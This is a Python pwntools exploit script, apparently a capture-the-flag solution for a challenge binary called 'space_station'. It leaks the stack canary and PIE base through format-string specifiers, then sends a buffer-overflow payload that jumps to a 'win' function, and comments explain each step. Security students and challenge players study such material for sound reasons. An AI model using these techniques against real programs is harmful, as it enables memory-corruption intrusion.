#!/usr/bin/env python3
from pwn import *
import re
#context.log_level='debug'
elf = context.binary = ELF("./space_station", checksec=False)

p = process(elf.path)
REMOTE_HOST = 'offsec.m0lecon.it'
HOST_PORT = 13573
#p= remote(REMOTE_HOST,HOST_PORT)


#4a3b4571d60d8400 (changes at every run) <- %19$lx ,canary position index = 19
#RUN-TIME MAIN ADDRESS <- %23$p
#offset buf to canary = 72 <-- cyclic_find("saaataaa") gdb with a break before the canary check
#offset to rip = 72+8+8 
#OFFSET_MAIN=0x1360 <-- objdump -d ./space_station | grep -n "<main>"
#ret_gadget= ROPgadget --binary ./space_station | grep "ret"



# Your exploit here
OFFSET_TO_CANARY= 72 #offset from the buffer to the canary
OFFSET_TO_RIP = 72+8+8#offset from the buffer to the RIP, OFFSET_TO_CANARY+8 (canary) + 8 (saved RBP) 
ret_gadget= 0x101a
CANARY_IDX = 15
OFFSET_MAIN=0x1360 #is the first address of main function when the program is not run

p.recvuntil(b"Enter your astronaut ID:")
p.sendline(f"%{CANARY_IDX}$lx %23$p".encode()) #$lx-> print as a value, $p print as a pointer
line=p.recvline()
leak=line.strip().split()
log.info(f"leak line = {leak}")
#1) CANARY-->Leak the canary(of the vuln function) (the idea is to identify where the canary is located in order to copy it and insert it into the payload), the position (CANARY_IDX) was calculated expliting the format string method %15$p. We know that we "reach" the canary when the value retived have 00 as a final numbers.

leak_canary= leak[0]
canary = int(leak_canary, 16)

#2)PIE--> To leak the pie protection the idea is to compute the offset that the PIE insert in run-time of the program(changes in every istance), to identify it the address of a "known" fuction (in that particular istance, in the vuln fuction, we found an "hidden" return to main) is needed, in this case we used the address of the main function (exploiting the format strings %23$p). We know that we "reach" the right address address when it start with 0x55... and ends with something like ..1360(1360 is the offset of the main when the program is not running) .Once we found that address we can compute the PIE BASE. Now the PIE_BASE is added in every address discovered locally (es. with ROPgadget) in order to obtain a valid addredd of that istance.

leak_main =leak[1]
PIE_BASE=int(leak_main, 16) 
PIE_BASE=PIE_BASE-OFFSET_MAIN
log.info(f"canary = {canary:#x}")
log.info(f"leak main = {PIE_BASE:#x}")



p.recvuntil(b"log:")
payload = flat(
    b"A" * OFFSET_TO_CANARY,
     p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(PIE_BASE+ret_gadget),    # ret gadget for alignment
    p64(PIE_BASE+elf.sym.win),
)
p.send(payload)
#print(p.recvline())
p.interactive()

#>>> print("".join(f"%{i}$lx." for i in range(1, 10)))

